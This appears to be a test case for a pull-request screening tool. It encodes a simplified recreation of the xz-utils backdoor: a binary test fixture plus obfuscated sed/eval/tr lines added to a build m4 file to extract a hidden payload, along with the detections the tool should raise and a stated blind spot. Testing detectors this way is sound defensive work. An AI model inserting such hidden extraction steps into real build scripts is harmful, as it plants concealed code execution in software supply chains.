@@ -1,0 +1,20 @@
+kind = "risky"
+title = "Build script extracts a payload hidden in a binary test fixture"
+source = "simplified recreation of the xz-utils backdoor (CVE-2024-3094)"
+known_limitation = "The payload lives in a binary test file and the extraction uses ordinary tr/head/sed commands. prscreen flags the binary only when it has an executable or archive extension."
+expect = ["OBF005 build-aux/build-to-host.m4:3"]
+allow = ["OBF007 tests/files/bad-3-corrupt_lzma2.xz"]
+
+[[file]]
+path = "tests/files/bad-3-corrupt_lzma2.xz"
+status = "added"
+binary = true
+
+[[file]]
+path = "build-aux/build-to-host.m4"
+removed = ["  gl_final_[$1]=\"$[$1]\""]
+added = [
+    "  gl_final_[$1]=\"$[$1]\"",
+    "  gl_[$1]_config='sed \"r\\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'",
+    "  gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"'",
+]
